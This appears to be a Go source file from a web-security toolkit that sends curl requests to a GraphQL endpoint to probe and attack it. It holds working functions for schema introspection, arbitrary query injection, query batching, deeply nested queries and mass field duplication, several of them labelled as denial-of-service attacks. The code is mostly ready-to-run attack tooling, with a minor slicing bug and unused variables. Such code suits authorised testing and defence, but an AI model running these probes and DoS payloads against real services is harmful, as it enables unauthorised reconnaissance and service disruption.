package websecurity

import (
	"fmt"
	"net/url"
	"strings"
)

func GraphQLIntrospection(endpoint string) (string, error) {
	query := `{"query":"query { __schema { types { name fields { name } } } }"}`
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", query, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("GraphQL introspection failed: %w: %s", err, string(out))
	}
	containsSchema := strings.Contains(string(out), "__schema") || strings.Contains(string(out), "types")
	return fmt.Sprintf("GraphQL introspection on %s: schema_found=%v response_len=%d", endpoint, containsSchema, len(out)), nil
}

func GraphQLInjection(endpoint, query string) (string, error) {
	payload := fmt.Sprintf(`{"query":"%s"}`, query)
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("GraphQL injection failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("GraphQL injection on %s: %s", endpoint, strings.TrimSpace(string(out))[:minInt(len(out), 300)]), nil
}

func GraphQLBatching(endpoint, queryTemplate string) (string, error) {
	var batched []string
	for i := 0; i < 10; i++ {
		batched = append(batched, fmt.Sprintf(`"query%d":"%s"`, i, queryTemplate))
	}
	payload := fmt.Sprintf("{%s}", strings.Join(batched, ","))
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("GraphQL batching failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("GraphQL batching attack on %s with %d queries: response_len=%d", endpoint, 10, len(out)), nil
}

func GraphQLDepth(endpoint, query string) (string, error) {
	depthQuery := query
	for i := 0; i < 10; i++ {
		depthQuery = fmt.Sprintf("{a%s:%s}", strings.Repeat("l", i+1), depthQuery)
	}
	payload := fmt.Sprintf(`{"query":"query{%s}"}`, depthQuery)
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", payload, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("GraphQL depth query failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("GraphQL deep query DoS on %s: response_len=%d", endpoint, len(out)), nil
}

func GraphQLFieldDuplication(endpoint string) (string, error) {
	var fields []string
	for i := 0; i < 100; i++ {
		fields = append(fields, fmt.Sprintf("id%d:id", i))
	}
	query := fmt.Sprintf(`{"query":"query{__typename{%s}}"}`, strings.Join(fields, " "))
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", query, endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("GraphQL field duplication failed: %w: %s", err, string(out))
	}
	return fmt.Sprintf("GraphQL field duplication DoS on %s with 100 duplicates: response_len=%d", endpoint, len(out)), nil
}

func GraphQLDetect(endpoint string) (string, error) {
	queries := []string{
		`{"query":"query{__typename}"}`,
		`{"query":"{__schema{types{name}}}"}`,
	}
	payload := url.Values{}
	payload.Set("query", "{__typename}")
	cmd := throttledExec("curl", "-s", "-X", "POST", "-H", "Content-Type: application/json", "-d", queries[0], endpoint)
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("GraphQL detection failed: %w: %s", err, string(out))
	}
	detected := strings.Contains(string(out), "__typename") || strings.Contains(string(out), "data")
	return fmt.Sprintf("GraphQL detection on %s: graphql_detected=%v response_len=%d", endpoint, detected, len(out)), nil
}
